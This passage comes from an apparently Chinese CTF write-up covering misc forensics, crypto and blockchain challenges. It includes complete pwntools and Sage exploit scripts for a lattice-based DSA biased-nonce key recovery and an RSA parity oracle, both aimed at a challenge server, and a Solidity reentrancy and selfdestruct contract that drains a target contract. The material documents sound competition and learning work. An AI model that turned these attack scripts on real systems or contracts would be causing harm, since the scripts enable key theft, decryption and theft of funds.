class="string">b"\",\"check\":\""</span> + check + <span class="string">b"\"&#125;"</span></span><br><span class="line">log.success(<span class="string">b"payload: "</span> + payload)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="misc">misc</span></h1><h2><span id="2019-ncov">2019-nCoV</span></h2><p>flag{shijiejiayou}</p><h2><span id="ez_memampusb">ez_mem&amp;usb</span></h2><p>流量包打开之后发现有两个上传data.zip的流量，把zip提取出来后，发现两个是相同的文件。任取一个解压，是一个vmem内存镜像文件，用volatility解析，发现内存中有文件and Settings.img，提取出来，发现有密码。继续用volatility分析进程，发现有个cmd进程，用cmdscan插件查看命令，得到压缩包密码<code>weak_auth_top100</code>,解压出一个usbdata.txt文件，常规套路解析usb流量可得flag:FLAG[69200835784EC3ED8D2A64E73FE913C0]，大写转小写，[]转{}即可。</p><h2><span id="misc-隐藏的信息">Misc-隐藏的信息</span></h2><p>二维码反色之后补全是假的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;this_is_also_not_flag&#125;</span><br><span class="line">解压密码不在这里0.0！</span><br></pre></td></tr></table></figure><p>ZIP是伪加密，解密的WAV文件包含一些DTMF信息 <img src="https://i.loli.net/2020/03/10/rBm7FbIcnCgHvQk.png" alt="image.png"> <img src="https://i.loli.net/2020/03/10/Zuj1AOhi3lPzB5I.png" alt="image.png"></p><p>对照下图还原信息：187485618521</p><figure><img src="https://i.loli.net/2020/03/10/KhVFBnIp8uqTclw.png" alt><figcaption>image.png</figcaption></figure><p>strings了一下原来二维码的图片，发现提示用base64来getflag</p><figure><img src="https://i.loli.net/2020/03/10/PZ2IrtoagE8pSdj.png" alt><figcaption>image.png</figcaption></figure><p>最后flag就是flag{MTg3NDg1NjE4NTIx}</p><h2><span id="武汉加油">武汉加油</span></h2><p>给了一张图片</p><p>后面padding了一个rar文件</p><p>vmp壳，直接用x64dbg不能调试。可以等运行起来attach上。然后直接能dump出来，估计vmp没有用好。正常vmp壳没这么好脱的。主逻辑很简单，输入6组字符串，按中文编码直接对比<code>'</code>,<code>武</code>,<code>汉</code>,<code>加</code>,<code>油</code>,<code>!</code>，然后打印flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ flag.exe</span><br><span class="line"><span class="string">'</span></span><br><span class="line"><span class="string">武</span></span><br><span class="line"><span class="string">汉</span></span><br><span class="line"><span class="string">加</span></span><br><span class="line"><span class="string">油</span></span><br><span class="line"><span class="string">!</span></span><br><span class="line"><span class="string">flag : &#123;zhong_guo_jia_you&#125;</span></span><br></pre></td></tr></table></figure><h2><span id="简单misc">简单Misc</span></h2><p>题目给的一个jpg图片和zip压缩包，压缩包有密码，先把图片拉到winhex发现，本来是一个zip压缩包，，然后后缀改成压缩包打开有一个txt文件，里面是摩斯密码解密得到字符串是另一个压缩包文件的密码，打开这个压缩包，里面还有一个txt，把里面内容base64解密得到flag</p><h1><span id="crypto">Crypto</span></h1><h2><span id="nhp">NHP</span></h2><p>类似TetCTF2019的yaecc https://colab.research.google.com/github/nguyenduyhieukma/CTF-Writeups/blob/master/TetCTF/2020/tetctf.ipynb</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_PoW</span><span class="params">(suffix, h)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"solving PoW......"</span></span><br><span class="line">    charset = [chr(x) <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">255</span>)]</span><br><span class="line">    <span class="keyword">for</span> p1 <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> p2 <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> p3 <span class="keyword">in</span> charset:</span><br><span class="line">                plaintext = p1 + p2+ p3+ suffix</span><br><span class="line">                m = hashlib.sha256()</span><br><span class="line">                m.update(plaintext)</span><br><span class="line">                <span class="keyword">if</span> m.hexdigest() == h:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"PoW solution has been found!"</span></span><br><span class="line">                    <span class="keyword">return</span> p1+p2+p3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'121.37.174.33'</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : r.sendline(s)</span><br><span class="line">rl = <span class="keyword">lambda</span>  : r.recvline()</span><br><span class="line">sd = <span class="keyword">lambda</span> s : r.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n=<span class="number">4096</span> : r.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : r.recvuntil(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(m)</span>:</span></span><br><span class="line">    l = <span class="number">40</span> - len(m)</span><br><span class="line">    res = <span class="string">'0'</span>*l + m</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getsign</span><span class="params">(name)</span>:</span></span><br><span class="line">    ru(<span class="string">'$'</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'Please input your username: '</span>)</span><br><span class="line">    sl(name)</span><br><span class="line">    ru(<span class="string">'k.bit_length() == '</span>)</span><br><span class="line">    kbits = int(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">    ru(<span class="string">'Here is your signature in hex: '</span>)</span><br><span class="line">    sign = ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> sign,kbits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(x,q,p,g)</span>:</span></span><br><span class="line">    m = <span class="string">'admin'</span></span><br><span class="line">    Hm = int(sha256(m).hexdigest(),<span class="number">16</span>)</span><br><span class="line">    k = <span class="number">2</span></span><br><span class="line">    k_inv = number.inverse(k, q)</span><br><span class="line">    r = pow(g, k, p) % q</span><br><span class="line">    s = (k_inv * (Hm + x * r)) % q</span><br><span class="line">    res = <span class="string">'admin'</span>.encode(<span class="string">'hex'</span>) + pad(hex(r)[<span class="number">2</span>:]) + pad(hex(s)[<span class="number">2</span>:])</span><br><span class="line">    ru(<span class="string">'$'</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'Please send me your signature: '</span>)</span><br><span class="line">    sl(res)</span><br><span class="line">    print(res)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">ru(<span class="string">'sha256(XXX + '</span>)</span><br><span class="line">suffix = (ru(<span class="string">')'</span>)[:<span class="number">-1</span>]).decode(<span class="string">'hex'</span>)</span><br><span class="line">ru(<span class="string">'== '</span>)</span><br><span class="line">h = ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">p = solve_PoW(suffix, h)</span><br><span class="line">p = p.encode(<span class="string">'hex'</span>)</span><br><span class="line">sl(p)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'p = '</span>)</span><br><span class="line">p = int(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">ru(<span class="string">'q = '</span>)</span><br><span class="line">q = int(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">ru(<span class="string">'g = '</span>)</span><br><span class="line">g = int(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">ru(<span class="string">'y = '</span>)</span><br><span class="line">y = int(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">print(<span class="string">'p = '</span> + str(p))</span><br><span class="line">print(<span class="string">'q = '</span> + str(q))</span><br><span class="line">print(<span class="string">'g = '</span> + str(g))</span><br><span class="line">print(<span class="string">'y = '</span> + str(y))</span><br><span class="line">qbits = q.bit_length()</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5000000</span>):</span><br><span class="line">    data,kbits = getsign(<span class="string">'ver'</span>)</span><br><span class="line">    <span class="keyword">if</span> qbits-kbits&gt;=<span class="number">8</span>:</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        success(<span class="string">'[+]Round: '</span>+ str(count))</span><br><span class="line">        m1 = int(data[:<span class="number">6</span>],<span class="number">16</span>)</span><br><span class="line">        r1 = int(data[<span class="number">6</span>:<span class="number">46</span>],<span class="number">16</span>)</span><br><span class="line">        s1 = int(data[<span class="number">-40</span>:],<span class="number">16</span>)</span><br><span class="line">        res.append((m1,(r1,s1)))</span><br><span class="line">    <span class="keyword">if</span> count&gt;=<span class="number">40</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"/home/anemone/SageMath/data.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(str(res))</span><br><span class="line"></span><br><span class="line">arg_list = [str(x) <span class="keyword">for</span> x <span class="keyword">in</span> [p,q,g,y]]</span><br><span class="line"></span><br><span class="line">SAGE = process([<span class="string">"/home/anemone/SageMath/sage"</span>, <span class="string">"/home/anemone/SageMath/exp.sage"</span>] + arg_list)</span><br><span class="line">x = int(SAGE.recvline().strip())</span><br><span class="line">SAGE.close()</span><br><span class="line"><span class="keyword">print</span> x</span><br><span class="line">sign(x,q,p,g)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>exp.sage</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"/home/anemone/SageMath/data.txt"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    d = f.readline()</span><br><span class="line">d = d.split(<span class="string">','</span>)</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(d),<span class="number">3</span>):</span><br><span class="line">    m = int(d[i][<span class="number">2</span>:])</span><br><span class="line">    r = int(d[i+<span class="number">1</span>][<span class="number">2</span>:<span class="number">-1</span>])</span><br><span class="line">    s = int(d[i+<span class="number">2</span>][<span class="number">1</span>:<span class="number">-3</span>].rstrip(<span class="string">'L'</span>))</span><br><span class="line">    data.append((m,(r,s)))</span><br><span class="line"><span class="keyword">assert</span> len(argv[<span class="number">1</span>:]) == <span class="number">4</span></span><br><span class="line"></span><br><span class="line">[p,q,g,y] = [Integer(x) <span class="keyword">for</span> x <span class="keyword">in</span> argv[<span class="number">1</span>:]]</span><br><span class="line"></span><br><span class="line">n = q</span><br><span class="line">Zn = Zmod(n)</span><br><span class="line"></span><br><span class="line">size = len(data)<span class="number">-1</span></span><br><span class="line">m = []</span><br><span class="line">Ai = [<span class="number">-1</span>]</span><br><span class="line">Bi = [<span class="number">0</span>]</span><br><span class="line">r0, s0 = map(Zn, data[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">z0 = Zn(ZZ(sha256(hex(data[<span class="number">0</span>][<span class="number">0</span>])[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)).hexdigest(), <span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">    message, sig = data[i+<span class="number">1</span>]</span><br><span class="line">    ri, si = map(Zn, sig)</span><br><span class="line">    zi = z = Zn(ZZ(sha256(hex(message)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)).hexdigest(), <span class="number">16</span>))</span><br><span class="line">    A = - (s0 * ri) / (r0 * si)</span><br><span class="line">    B = (z0 * ri) / (si * r0) - zi / si</span><br><span class="line">    Ai.append(A)</span><br><span class="line">    Bi.append(B)</span><br><span class="line"></span><br><span class="line">Ai.append(<span class="number">0</span>)</span><br><span class="line">res = n//<span class="number">2</span>^<span class="number">8</span></span><br><span class="line">Bi.append(res)</span><br><span class="line">m.append(Ai)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">    m.append([<span class="number">0</span>]*(i+<span class="number">1</span>) + [n] + [<span class="number">0</span>]*(size-i))</span><br><span class="line"></span><br><span class="line">m.append(Bi)</span><br><span class="line">m = Matrix(ZZ, m)</span><br><span class="line"></span><br><span class="line">mLLL = m.LLL()</span><br><span class="line"></span><br><span class="line"><span class="comment">#print mLLL</span></span><br><span class="line"><span class="keyword">for</span> irow, row <span class="keyword">in</span> enumerate(mLLL):</span><br><span class="line">    k0 = Zn(row[<span class="number">0</span>])</span><br><span class="line">    x = (s0*k0-z0)/r0</span><br><span class="line">    x = x%q</span><br><span class="line">    <span class="keyword">if</span> pow(g, x, p) == y:</span><br><span class="line">        print(<span class="string">"&#123;:d&#125;"</span>.format(int(x)))</span><br><span class="line">    k0 = Zn(-row[<span class="number">0</span>])</span><br><span class="line">    x = (s0*k0-z0)/r0</span><br><span class="line">    x = x%q</span><br><span class="line">    <span class="keyword">if</span> pow(g, x, p) == y:</span><br><span class="line">        print(<span class="string">"&#123;:d&#125;"</span>.format(int(x)))</span><br></pre></td></tr></table></figure><h2><span id="lancet">lancet</span></h2><p>RSA parity oracle</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum, gmpy2, socket, time, decimal</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'121.37.174.33'</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(m)</span>:</span></span><br><span class="line">    m = long_to_bytes(m)</span><br><span class="line">    m = base64.b64encode(m)</span><br><span class="line">    length = len(m)</span><br><span class="line">    r.recvuntil(<span class="string">'you can choose what you want here\n'</span>)</span><br><span class="line">    r.send(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'send how long you want to decrypt\n'</span>)</span><br><span class="line">    r.send(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">'send the message in base64 encode\n'</span>)</span><br><span class="line">    r.send(m)</span><br><span class="line">    r.recvuntil(<span class="string">'res:'</span>)</span><br><span class="line">    choice = r.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'1'</span> == choice:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'0'</span> == choice:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'n:'</span>)</span><br><span class="line">    n = int(r.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">    r.recvuntil(<span class="string">'e:'</span>)</span><br><span class="line">    e = int(r.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">    <span class="comment">#e = 65537</span></span><br><span class="line">    r.recvuntil(<span class="string">'flag:'</span>)</span><br><span class="line">    c = int(r.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">    c_of_2 = pow(<span class="number">2</span>, e, n)</span><br><span class="line">    m = partial((c * c_of_2) % n, n,e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, n,e)</span>:</span></span><br><span class="line">    c_of_2 = pow(<span class="number">2</span>, e, n)</span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k  <span class="comment"># allows for 'precise enough' floats</span></span><br><span class="line">    lower = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    upper = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        possible_plaintext = (lower + upper) / <span class="number">2</span></span><br><span class="line">        <span class="comment"># lower==0 when i&lt;1809</span></span><br><span class="line">        c += n*<span class="number">10</span>**<span class="number">2048</span></span><br><span class="line">        flag = oracle(c)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            upper = possible_plaintext  <span class="comment"># plaintext is in the lower half</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lower = possible_plaintext  <span class="comment"># plaintext is in the upper half</span></span><br><span class="line">        c = (c * c_of_2) % n  <span class="comment"># multiply y by the encryption of 2 again</span></span><br><span class="line">        <span class="keyword">print</span> i, flag, int(upper - lower)</span><br><span class="line">        <span class="comment"># time.sleep(0.2)</span></span><br><span class="line">    <span class="comment"># By now, our plaintext is revealed!</span></span><br><span class="line">    <span class="keyword">print</span> upper</span><br><span class="line">    <span class="keyword">print</span> long_to_bytes(upper)</span><br><span class="line">    <span class="keyword">return</span> int(upper)</span><br><span class="line"></span><br><span class="line">challenge()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1><span id="区块链">区块链</span></h1><h2><span id="blockchain-ownermoney">BlockChain-OwnerMoney</span></h2><p>先弄四个结尾为0xfff的合约，然后把balance集中到一个合约 自毁给目标合约凑够400wei 然后就直接重入攻击即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract bank&#123;</span><br><span class="line">    function buy() public payable&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    function change(address addr) public&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    function sell(uint256 num) public&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    function transfer(address,uint256) public&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Anemone&#123;</span><br><span class="line">    address taddr = 0x40a590b70790930ceed4d148bf365eea9e8b35f4;</span><br><span class="line">    bank public target = bank(taddr);</span><br><span class="line">    uint public isOwner = 0;</span><br><span class="line">    uint public flag = 0;</span><br><span class="line">    uint public num = 200;</span><br><span class="line"></span><br><span class="line">    function Anemone() payable&#123;</span><br><span class="line">        uint256 addr = uint256(address(this));</span><br><span class="line">        if(addr&amp;0xfff!=0xfff)&#123;</span><br><span class="line">            selfdestruct(msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function setnum(uint256 n) public &#123;</span><br><span class="line">        num = n;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function step1() public payable &#123;</span><br><span class="line">        target.buy.value(1 wei)();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function step2() public payable&#123;</span><br><span class="line">        target.sell(num);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function step3() public&#123;</span><br><span class="line">        target.change(target);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function step4() public&#123;</span><br><span class="line">        taddr.call(0x11f776bc);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function transfer(address addr) public&#123;</span><br><span class="line">        target.transfer(addr,100);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payflag(string email)&#123;</span><br><span class="line">        taddr.call(0x6bc344bc,0x20,0x18,email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function kill(address addr) public &#123;</span><br><span class="line">        selfdestruct(addr);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function pay() public payable&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    function isOwner(address addr) public returns (uint256)&#123;</span><br><span class="line">        if(isOwner!=1)&#123;</span><br><span class="line">            isOwner = 1;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;  </span><br><span class="line">        else</span><br><span class="line">            return 1;    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    function () public payable &#123;</span><br><span class="line">        if(msg.sender == taddr)&#123;</span><br><span class="line">            if(flag == 0)&#123;</span><br><span class="line">                flag = 1;</span><br><span class="line">                target.sell(num);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="pwn">Pwn</span></h1><h2><span id="easyvm">EasyVM</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 